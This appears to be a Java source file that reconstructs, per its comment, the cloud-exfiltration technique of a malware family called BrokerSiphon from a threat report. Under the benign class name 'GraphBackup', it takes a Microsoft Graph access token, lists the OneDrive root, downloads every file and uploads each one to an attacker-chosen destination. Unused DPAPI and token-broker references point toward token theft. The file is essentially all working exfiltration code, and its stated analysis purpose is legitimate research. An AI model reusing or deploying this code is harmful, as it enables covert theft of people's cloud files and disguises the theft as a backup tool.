import java.nio.file.*;
import java.nio.charset.StandardCharsets;
import java.net.URI;
import java.net.http.*;
import java.util.*;
import com.google.gson.*;
import com.sun.jna.platform.win32.Crypt32Util;

// Technique reconstruction from TENEX Figure 14 and token/cloud sections.
// Not recovered BrokerSiphon source. No entry point; never executed in testing.
class GraphBackup {
  static final HttpClient client = HttpClient.newHttpClient();
  static void collect(Path tokenBrokerDir, URI destination, String destinationToken) throws Exception {
        String access = System.getenv("GRAPH_ACCESS_TOKEN");
        HttpRequest read = HttpRequest.newBuilder(URI.create("https://graph.microsoft.com/v1.0/me/drive/root/children"))
          .header("Authorization", "Bearer " + access).GET().build();
        String listing = client.send(read, HttpResponse.BodyHandlers.ofString()).body();
        for (JsonElement child : JsonParser.parseString(listing).getAsJsonObject().getAsJsonArray("value")) {
          String id = child.getAsJsonObject().get("id").getAsString();
          HttpRequest download = HttpRequest.newBuilder(URI.create("https://graph.microsoft.com/v1.0/me/drive/items/" + id + "/content"))
            .header("Authorization", "Bearer " + access).GET().build();
          byte[] content = client.send(download, HttpResponse.BodyHandlers.ofByteArray()).body();
          HttpRequest upload = HttpRequest.newBuilder(destination)
            .header("Authorization", "Bearer " + destinationToken)
            .PUT(HttpRequest.BodyPublishers.ofByteArray(content)).build();
          client.send(upload, HttpResponse.BodyHandlers.discarding());
        }
  }
}
